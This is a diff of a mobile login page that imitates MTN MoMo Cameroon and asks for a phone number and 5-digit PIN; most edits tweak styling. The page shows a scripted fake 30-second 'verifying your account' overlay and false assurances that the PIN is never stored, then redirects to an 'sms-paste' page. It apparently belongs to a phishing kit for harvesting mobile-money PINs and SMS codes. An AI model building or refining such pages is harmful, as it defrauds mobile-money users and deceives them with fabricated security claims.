@@ -11,13 +11,14 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         html,
         body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             overflow: hidden;
         }
 
@@ -35,7 +36,7 @@
         header {
             width: 100%;
             max-width: 480px;
-            padding: 15px 20px;
+            padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -47,19 +48,15 @@
         }
 
         .back-btn {
-            font-size: 28px;
+            font-size: 24px;
             background: none;
             border: none;
             cursor: pointer;
             color: #333;
-            transition: transform 0.2s;
             line-height: 1;
-            width: 28px;
+            width: 24px;
             text-align: left;
-        }
-
-        .back-btn:hover {
-            transform: scale(1.1);
+            padding: 0;
         }
 
         .logo-container {
@@ -75,8 +72,8 @@
             background: #0047AB;
             color: #FFCC00;
             font-weight: 700;
-            font-size: 18px;
-            padding: 8px 18px;
+            font-size: 16px;
+            padding: 7px 16px;
             border-radius: 40px;
             line-height: 1;
             letter-spacing: -0.5px;
@@ -88,52 +85,32 @@
         .card {
             background: white;
             border-radius: 24px;
-            padding: 32px 25px 28px;
+            padding: 24px 20px;
             width: 100%;
             max-width: 480px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
-            overflow-x: hidden;
             flex: 1;
             min-height: 0;
-            -webkit-overflow-scrolling: touch;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow-y: auto;
         }
 
-        .card::-webkit-scrollbar {
-            width: 6px;
-        }
-        .card::-webkit-scrollbar-track {
-            background: transparent;
-            margin: 10px 0;
-        }
-        .card::-webkit-scrollbar-thumb {
-            background: #d0d8e8;
-            border-radius: 3px;
-        }
-        .card::-webkit-scrollbar-thumb:hover {
-            background: #b0bcd4;
-        }
-
-        /* ===== INPUT GROUPS ===== */
+        /* ===== FORM FIELDS ===== */
         .phone-input-group {
-            margin-bottom: 22px;
-        }
-
-        .phone-input-group:first-of-type {
-            margin-top: 4px;
+            margin-bottom: 18px;
         }
 
         .input-label {
             display: block;
             font-weight: 600;
             color: #333;
-            margin-bottom: 8px;
-            font-size: 14px;
+            margin-bottom: 7px;
+            font-size: 13px;
         }
 
-        /* ===== PHONE INPUT WITH FLAG ===== */
+        /* Phone input */
         .phone-input {
             display: flex;
             align-items: center;
@@ -152,11 +129,11 @@
         .phone-prefix {
             display: flex;
             align-items: center;
-            gap: 6px;
-            padding: 14px 14px;
+            gap: 5px;
+            padding: 12px 12px;
             background: #f0f4ff;
             font-weight: 700;
-            font-size: 16px;
+            font-size: 15px;
             color: #0047AB;
             border-right: 2px solid #e0e0e0;
             white-space: nowrap;
@@ -164,8 +141,8 @@
         }
 
         .flag-svg {
-            width: 22px;
-            height: 15px;
+            width: 20px;
+            height: 14px;
             border-radius: 2px;
             box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
             flex-shrink: 0;
@@ -176,8 +153,8 @@
             box-shadow: none !important;
             flex: 1;
             border-radius: 0;
-            padding: 14px 16px;
-            font-size: 16px;
+            padding: 12px 14px;
+            font-size: 15px;
             font-family: 'Inter', sans-serif;
             color: #333;
             outline: none;
@@ -189,12 +166,12 @@
             color: #bbb;
         }
 
-        /* ===== PIN INPUT (5 digits) ===== */
+        /* ===== PIN (SMALL, CENTERED, FIXED SIZE) ===== */
         .pin-label-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 7px;
         }
 
         .pin-label-row .input-label {
@@ -202,45 +179,41 @@
         }
 
         .forgot-link {
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             color: #0047AB;
             text-decoration: none;
             cursor: pointer;
         }
 
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
         .pin-boxes {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             gap: 10px;
-            margin-bottom: 4px;
         }
 
         .pin-box {
-            flex: 1;
-            aspect-ratio: 1 / 1;
-            max-width: 64px;
+            width: 44px;
+            height: 48px;
             text-align: center;
-            font-size: 24px;
+            font-size: 20px;
             font-weight: 800;
             color: #1a1a2e;
             border: 2px solid #e0e0e0;
-            border-radius: 14px;
+            border-radius: 10px;
             background: #fafbff;
             transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
             outline: none;
             font-family: 'Inter', sans-serif;
             caret-color: #0047AB;
+            padding: 0;
+            flex: none;
         }
 
         .pin-box:focus {
             border-color: #0047AB;
             background: #f0f4ff;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
+            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
         }
 
         .pin-box.filled {
@@ -250,7 +223,7 @@
 
         .pin-box.invalid {
             border-color: #e74c3c;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.12);
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
             animation: shake 0.4s ease;
         }
 
@@ -264,7 +237,7 @@
         .error-text {
             color: #e74c3c;
             font-size: 12px;
-            margin-top: 6px;
+            margin-top: 5px;
             display: none;
             font-weight: 500;
             line-height: 1.4;
@@ -272,33 +245,22 @@
 
         .error-text.show {
             display: block;
-            animation: slideDown 0.3s ease;
-        }
-
-        @keyframes slideDown {
-            0% { opacity: 0; transform: translateY(-5px); }
-            100% { opacity: 1; transform: translateY(0); }
         }
 
         /* ===== LOGIN BUTTON ===== */
         .login-btn {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             background: linear-gradient(135deg, #0047AB, #002D7A);
             color: white;
             border: none;
             border-radius: 50px;
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
             font-family: 'Inter', sans-serif;
-            margin-top: 24px;
-        }
-
-        .login-btn:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+            margin-top: 22px;
         }
 
         .login-btn:active:not(:disabled) {
@@ -308,31 +270,24 @@
         .login-btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
         }
 
-        /* ===== SECURITY NOTICE ===== */
+        /* ===== SECURITY + SIGNUP ===== */
         .security-notice {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 6px;
-            margin-top: 18px;
-            font-size: 12px;
+            gap: 5px;
+            margin-top: 14px;
+            font-size: 11px;
             color: #999;
         }
 
-        .security-notice .lock-icon {
-            font-size: 14px;
-        }
-
-        /* ===== SIGNUP LINK ===== */
         .signup-text {
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
             color: #777;
-            margin-top: 22px;
-            padding-bottom: 4px;
+            margin-top: 14px;
         }
 
         .signup-text a {
@@ -341,15 +296,11 @@
             text-decoration: none;
         }
 
-        .signup-text a:hover {
-            text-decoration: underline;
-        }
-
         /* ===== FOOTER ===== */
         footer {
-            padding: 10px;
+            padding: 6px;
             color: #aaa;
-            font-size: 12px;
+            font-size: 11px;
             text-align: center;
             width: 100%;
             max-width: 480px;
@@ -369,20 +320,17 @@
             justify-content: center;
             padding: 32px 24px;
             z-index: 2000;
-            opacity: 0;
-            transition: opacity 0.35s ease;
         }
 
         .verify-overlay.show {
             display: flex;
-            opacity: 1;
         }
 
         .verify-content {
             display: flex;
             flex-direction: column;
             align-items: center;
-            max-width: 380px;
+            max-width: 340px;
             text-align: center;
         }
 
@@ -393,13 +341,12 @@
             background: #0047AB;
             color: #FFCC00;
             font-weight: 800;
-            font-size: 22px;
-            padding: 12px 24px;
+            font-size: 20px;
+            padding: 11px 22px;
             border-radius: 50px;
             line-height: 1;
-            letter-spacing: -0.5px;
             box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
-            margin-bottom: 36px;
+            margin-bottom: 32px;
             animation: overlayPulse 2s ease-in-out infinite;
         }
 
@@ -409,13 +356,13 @@
         }
 
         .verify-spinner {
-            width: 56px;
-            height: 56px;
+            width: 52px;
+            height: 52px;
             border: 5px solid #e0e8ff;
             border-top-color: #0047AB;
             border-radius: 50%;
             animation: verifySpin 0.9s linear infinite;
-            margin-bottom: 28px;
+            margin-bottom: 26px;
         }
 
         @keyframes verifySpin {
@@ -423,7 +370,7 @@
         }
 
         .verify-title {
-            font-size: 20px;
+            font-size: 19px;
             font-weight: 800;
             color: #1a1a2e;
             margin-bottom: 10px;
@@ -435,11 +382,10 @@
         }
 
         .verify-subtitle {
-            font-size: 14px;
+            font-size: 13px;
             color: #888;
             line-height: 1.6;
-            margin-bottom: 32px;
-            padding: 0 12px;
+            margin-bottom: 28px;
         }
 
         .verify-dots span {
@@ -456,12 +402,12 @@
         }
 
         .verify-bar {
-            width: 220px;
+            width: 200px;
             height: 5px;
             background: #e8edf7;
             border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
 
         .verify-bar-fill {
@@ -469,56 +415,56 @@
             width: 0%;
             background: linear-gradient(90deg, #0047AB, #FFCC00);
             border-radius: 4px;
-            transition: width 1s linear;
         }
 
         .verify-security {
             display: flex;
             align-items: center;
-            gap: 6px;
-            font-size: 12px;
+            gap: 5px;
+            font-size: 11px;
             color: #aaa;
         }
 
-        .verify-security .lock-icon {
-            font-size: 14px;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            body {
-                padding: 8px;
-                gap: 8px;
-            }
-            header {
-                padding: 12px 16px;
+        /* ===== SMALL PHONES ===== */
+        @media (max-height: 700px) {
+            .phone-input-group {
+                margin-bottom: 14px;
             }
             .card {
-                padding: 26px 18px 22px;
+                padding: 18px 16px;
+            }
+            .login-btn {
+                margin-top: 16px;
+                padding: 14px;
+            }
+            .security-notice,
+            .signup-text {
+                margin-top: 10px;
+            }
+            .momo-icon {
+                font-size: 15px;
+                padding: 6px 14px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .pin-boxes {
+                gap: 8px;
             }
             .pin-box {
-                font-size: 20px;
-                border-radius: 12px;
+                width: 40px;
+                height: 44px;
+                font-size: 18px;
+                border-radius: 9px;
             }
             .phone-prefix {
-                padding: 12px 10px;
+                padding: 11px 10px;
                 font-size: 14px;
                 gap: 4px;
             }
-            .flag-svg {
-                width: 20px;
-                height: 14px;
-            }
             .phone-input input {
-                padding: 12px 12px;
-                font-size: 15px;
-            }
-            .verify-momo-icon {
-                font-size: 20px;
-                padding: 10px 22px;
-            }
-            .verify-title {
-                font-size: 18px;
+                padding: 11px 12px;
+                font-size: 14px;
             }
         }
     </style>
@@ -529,11 +475,11 @@
         <div class="logo-container">
             <span class="momo-icon">MoMo</span>
         </div>
-        <div style="width:28px;"></div>
+        <div style="width:24px;"></div>
     </header>
 
     <main class="card">
-        <!-- Phone Number with Cameroon flag -->
+        <!-- Phone -->
         <div class="phone-input-group">
             <label class="input-label">MoMo Phone Number</label>
             <div class="phone-input" id="phoneWrapper">
@@ -542,8 +488,7 @@
                         <rect width="300" height="600" fill="#007A5E"/>
                         <rect x="300" width="300" height="600" fill="#CE1126"/>
                         <rect x="600" width="300" height="600" fill="#FCD116"/>
-                        <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275"
-                                 fill="#FCD116"/>
+                        <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
                     </svg>
                     <span>+237</span>
                 </span>
@@ -552,7 +497,7 @@
             <div class="error-text" id="phoneError">Please enter a valid Cameroon phone number (9 digits)</div>
         </div>
 
-        <!-- PIN (5 digits) -->
+        <!-- PIN -->
         <div class="phone-input-group">
             <div class="pin-label-row">
                 <label class="input-label">MoMo PIN</label>
@@ -571,7 +516,7 @@
         <button class="login-btn" id="loginBtn">LOGIN →</button>
 
         <div class="security-notice">
-            <span class="lock-icon">🔒</span>
+            <span>🔒</span>
             <span>Your PIN is secure and never stored</span>
         </div>
 
@@ -582,37 +527,26 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- ============================================
-         VERIFYING OVERLAY
-         ============================================ -->
+    <!-- VERIFYING OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
-
             <div class="verify-spinner"></div>
-
             <h2 class="verify-title">
                 Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
             </h2>
-            <p class="verify-subtitle">
-                Please wait, this may take some seconds
-            </p>
-
+            <p class="verify-subtitle">Please wait, this may take some seconds</p>
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
-
             <div class="verify-security">
-                <span class="lock-icon">🔒</span>
+                <span>🔒</span>
                 <span>Secure connection to MTN MoMo</span>
             </div>
         </div>
     </div>
 
     <script>
-        // ============================================
-        // PHONE INPUT FORMATTER
-        // ============================================
         const phoneInput = document.getElementById('phone');
         const phoneWrapper = document.getElementById('phoneWrapper');
         const phoneError = document.getElementById('phoneError');
@@ -626,9 +560,6 @@
             }
         });
 
-        // ============================================
-        // PIN INPUT (5 boxes, auto-advance, backspace, paste)
-        // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
             document.getElementById('pin2'),
@@ -643,9 +574,7 @@
                 this.value = this.value.replace(/\D/g, '');
                 if (this.value) {
                     this.classList.add('filled');
-                    if (index < pinBoxes.length - 1) {
-                        pinBoxes[index + 1].focus();
-                    }
+                    if (index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
                 } else {
                     this.classList.remove('filled');
                 }
@@ -672,11 +601,7 @@
                         pinBoxes[i].classList.add('filled');
                     }
                     const nextEmpty = pinBoxes.findIndex(b => !b.value);
-                    if (nextEmpty !== -1) {
-                        pinBoxes[nextEmpty].focus();
-                    } else {
-                        pinBoxes[pinBoxes.length - 1].focus();
-                    }
+                    pinBoxes[nextEmpty !== -1 ? nextEmpty : pinBoxes.length - 1].focus();
                 }
             });
         });
@@ -685,42 +610,29 @@
             return pinBoxes.map(b => b.value).join('');
         }
 
-        // ============================================
-        // VERIFY OVERLAY CONTROLLER
-        // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
 
         function showVerifying(durationMs, onDone) {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
-
             const totalSeconds = Math.round(durationMs / 1000);
             const startTime = Date.now();
 
             const tick = setInterval(function() {
                 const elapsedMs = Date.now() - startTime;
-                const elapsedSec = elapsedMs / 1000;
-
-                const raw = elapsedSec / totalSeconds;
+                const raw = (elapsedMs / 1000) / totalSeconds;
                 const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
-                const percent = Math.min(eased * 100, 99);
-
-                verifyBarFill.style.width = percent.toFixed(1) + '%';
+                verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
 
                 if (elapsedMs >= durationMs) {
                     clearInterval(tick);
                     verifyBarFill.style.width = '100%';
-                    setTimeout(function() {
-                        onDone();
-                    }, 350);
+                    setTimeout(onDone, 350);
                 }
             }, 1000 / 30);
         }
 
-        // ============================================
-        // LOGIN BUTTON
-        // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', function() {
@@ -728,7 +640,6 @@
             if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
                 phoneError.classList.add('show');
-                phoneInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 phoneInput.focus();
                 return;
             }
@@ -737,43 +648,29 @@
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
                 pinError.classList.add('show');
-                pinBoxes[0].scrollIntoView({ behavior: 'smooth', block: 'center' });
                 pinBoxes[0].focus();
                 return;
             }
 
-            const session = {
+            localStorage.setItem('momoSession', JSON.stringify({
                 phone: '+237' + phoneDigits,
                 country: 'CM',
                 loggedInAt: new Date().toISOString(),
                 pinLength: 5
-            };
-            localStorage.setItem('momoSession', JSON.stringify(session));
+            }));
 
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
-            console.log('🔐 Login submitted:', { phone: session.phone, pin: '•••••' });
-
-            const VERIFY_DURATION_MS = 30000;
-
-            showVerifying(VERIFY_DURATION_MS, function() {
+            showVerifying(30000, function() {
                 window.location.href = 'sms-paste.html';
             });
         });
 
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
-            if (digits.length === 9 && !getPinValue()) {
-                pinBoxes[0].focus();
-            }
+            if (digits.length === 9 && !getPinValue()) pinBoxes[0].focus();
         });
-
-        console.log('====================================');
-        console.log('💰 MTN MoMo Loan – Cameroon');
-        console.log('🔐 Login Page Loaded');
-        console.log('⏳ Verify overlay = 30s → sms-paste.html');
-        console.log('====================================');
     </script>
 </body>
 </html>
